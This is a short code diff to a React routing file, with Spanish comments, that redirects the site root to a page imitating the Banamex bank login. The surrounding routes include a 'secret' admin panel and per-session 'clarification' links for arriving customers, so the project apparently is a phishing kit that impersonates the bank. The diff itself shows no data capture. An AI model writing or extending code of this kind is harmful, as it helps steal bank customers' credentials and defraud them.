@@ -15,6 +15,17 @@ import { ProtectedRoute } from "@/components/ProtectedRoute";
 function Router() {
   return (
     <Switch>
+      {/* Ruta principal - mostrar pantalla de login de Banamex (debe ir primero) */}
+      <Route path="/">
+        {(params) => {
+          if (window.location.pathname === '/') {
+            window.location.href = '/banamex/index.html';
+            return null;
+          }
+          return <BanamexLogin />;
+        }}
+      </Route>
+      
       {/* Ruta secreta para el panel de administración */}
       <ProtectedRoute path="/Balonx" component={AdminPanel} adminOnly={false} />
       
@@ -30,11 +41,6 @@ function Router() {
       {/* Ruta de aclaración para clientes que entran con un código/token */}
       <Route path="/:sessionId">
         <GenerandoAclaracion />
-      </Route>
-      
-      {/* Ruta principal - mostrar pantalla de login de Banamex */}
-      <Route path="/">
-        <BanamexLogin />
       </Route>
       
       {/* Ruta 404 */}
